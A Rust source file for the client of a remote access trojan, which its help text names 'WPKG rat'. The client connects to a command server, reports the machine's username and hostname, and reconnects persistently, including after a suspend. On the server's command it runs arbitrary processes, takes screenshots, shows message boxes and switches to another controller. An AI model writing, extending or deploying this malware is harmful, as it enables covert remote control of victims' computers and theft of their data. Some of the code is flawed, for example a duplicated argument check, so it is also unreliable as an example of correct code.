use std::io::{Read, Write};
use std::net::TcpStream;
use std::{thread, time};
use std::time::{Duration, SystemTime};
use std::sync::{Arc, Mutex};

use anyhow::anyhow;
use anyhow::Result;
use async_recursion::async_recursion;
use tracing::{error, info};

use crate::globals;
use crate::unwrap::CustomUnwrap;
use crate::utils;

#[async_recursion(?Send)]
pub async fn connect(addr: String) {
    // connect to the ServerD
    match Client::new(addr.clone()) {
        Ok(mut client) => {
            info!("Connected!");
            // reconnect if error
            if let Err(e) = client.run().await {
                error!("Unexpected error {}", e);
                thread::sleep(time::Duration::from_secs(10));
                connect(addr).await;
            }
        }
        // reconnect to the server
        Err(_e) => {
            error!("Unable to connect to the server. Reconnecting...");
            thread::sleep(time::Duration::from_secs(10));
            connect(addr).await;
        }
    }
}

pub struct Client {
    stream: TcpStream,
    connected: bool,
    address: String,
    reconnecting: bool,
}

impl Client {
    pub fn new(address: String) -> Result<Self> {
        // connect to the server
        let stream = TcpStream::connect(address.clone())?;

        Ok(Self {
            stream,
            connected: true,
            address,
            reconnecting: false,
        })
    }

    pub fn receive(&mut self) -> Result<String> {
        // allocate an empty buffer
        let mut data = [0; 65536];

        // read buffer
        let len = self.stream.read(&mut data)?;

        // get buffer without "empty" bytes
        let recv_buf = &data[0..len];

        // parse buffer into String
        let buf_str = String::from_utf8(recv_buf.to_vec())?;

        info!("[Received]: {}", buf_str);

        Ok(buf_str)
    }

    pub fn rawdata_recieve(&mut self) -> Result<Vec<u8>> {
        // allocate an empty buffer
        let mut data = [0; 65536];

        // read buffer
        let len = self.stream.read(&mut data)?;

        // get buffer without "empty" bytes
        let recv_buf = &data[0..len];

        Ok(recv_buf.to_vec())
    }

    pub fn rawdata_send(&mut self, message: &[u8]) -> Result<()> {
        self.stream.write_all(message)?;

        Ok(())
    }

    /// Send a message to the server
    pub fn send(&mut self, message: &str) -> Result<()> {
        info!("[Sended]: {}", message);

        // send message to the server
        self.stream.write_all(message.to_string().as_bytes())?;

        Ok(())
    }

    /// Send command to the server
    pub fn send_command(&mut self, message: &str) -> Result<String> {
        // send command
        self.send(message)?;

        // recive command output
        self.receive()
    }

    pub fn check_args(&mut self, args: Vec<&str>, length: usize) -> Result<bool> {
        if args.len() < length {
            self.send("Missing arguments")?;
            return Ok(false);
        } else if args.len() < length {
            self.send("To much arguments")?;
            return Ok(false);
        }

        Ok(true)
    }

    //detecting computer suspend and reconnecting
    fn suspend_handler(&mut self) -> anyhow::Result<()> {
        let arc_connected = Arc::new(Mutex::new(self.connected));
        let tcp_stream = self.stream.try_clone()?;

        thread::spawn(move || {
            info!("Starting suspend detecting system...");

            while *Arc::clone(&arc_connected).lock().unwrap() {
                let time: u64 = 1;

                let before = SystemTime::now();
                thread::sleep(Duration::from_secs(time));
                let now = before.elapsed().unwrap();

                if now.as_secs() > time {
                    info!("Suspend detected... Reconnecting...");
                    tcp_stream.shutdown(std::net::Shutdown::Both).unwrap_log();
                    return;
                }
            }
        });

        Ok(())
    }

    /// Close the connection
    pub fn close(&mut self) -> Result<()> {
        self.connected = false;

        self.stream.shutdown(std::net::Shutdown::Both)?;

        Ok(())
    }

    #[async_recursion]
    pub async fn run(&mut self) -> anyhow::Result<()> {
        info!("Client started working");

        self.suspend_handler()?;

        // setup client name
        self.send_command(
            format!("/setname {}@{}", whoami::username(), whoami::hostname()).as_str(),
        )?;

        //setting version in server
        self.send_command(format!("/about {}",globals::CURRENT_VERSION).as_str())?;

        while self.connected {
            // receive message from the server
            let message = self.receive()?;

            if message.is_empty() {
                return if self.reconnecting {
                    Ok(())
                } else {
                    Err(anyhow!("Client crashed, reconnecting"))
                }
            }

            // split message
            let command = message.split_ascii_whitespace().collect::<Vec<&str>>();

            // parse args to Vec
            let args = command[1..command.len()].to_vec();

            match command[0] {
                // send message box
                "msg" => {
                    if self.check_args(args.clone(), 1)? {
                        utils::messagebox(args.join(" "));
                        self.send("Done")?;
                    }
                }

                // get system status
                "stat" => {
                    self.send(&utils::stat())?;
                }
                "run" => {
                    if args.clone().is_empty() {
                        self.send("Missing argument")?;
                    } else {
                        let a = if args.len() <= 1 { vec![""] } else { args[1..args.len()].to_vec() };
                        utils::run_process(args[0], a, false)?;
                        self.send("Done")?;
                    }
                }
                "reconnect" => {
                    if self.check_args(args.clone(), 2)? {
                        match Client::new(format!("{}:{}", args[0], args[1])) {
                            Ok(mut client) => {
                                info!("Reconnected succesfully to {}:{}!", args[0], args[1]);

                                self.send("Succesfully reconnected client... disconnecting...")?;
                                self.send_command("/disconnect")?;

                                self.reconnecting = true;

                                self.close()?;

                                client.run().await?;
                            }
                            Err(_e) => {
                                error!("Error reconnecting to server");
                                self.send("Error reconnecting to server")?;
                            }
                        }
                    }
                }

                "screenshot" => {
                    let url = utils::screenshot_url().await?;

                    self.send(&url)?;
                }
                // disconnect from the server
                "disconnect" => {
                    self.send("Done")?;

                    self.send_command("/disconnect")?;
                    self.close()?;
                }

                "ping" => self.send("ping-received")?,

                "version" => self.send(globals::CURRENT_VERSION)?,

                // send help message
                "help" => {
                    let help = format!(
                        "{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}",
                        "msg <message> - showing message\n",
                        "stat - sending pc stats (CPU, RAM and Swap)\n",
                        "run <process> <args> - run process\n",
                        "reconnect <ip> <port> - reconnecting to another ServerD\n",
                        "screenshot - make screenshot and sending url\n",
                        "disconnect - disconnecting ServerD Client\n",
                        "ping - sending ping\n",
                        "version - get version of WPKG rat\n",
                        "help - showing help\n",
                        "cd <dir> - changing dir",
                        "pwd - showing directory\n",
                        "ls - list files in dir\n",
                        "mkdir <name> - creating folder\n",
                        "rm <name> - removing file\n",
                        "cat <name> - reading file"
                    );
                    self.send(&help)?;
                }
                _ => self.send("Unknown command")?,
            }
        }

        Ok(())
    }
}

/// "Correctly" close connection
impl Drop for Client {
    #[allow(unused_must_use)]
    fn drop(&mut self) {
        self.send_command("/disconnect");
        self.close().unwrap_log();
    }
}
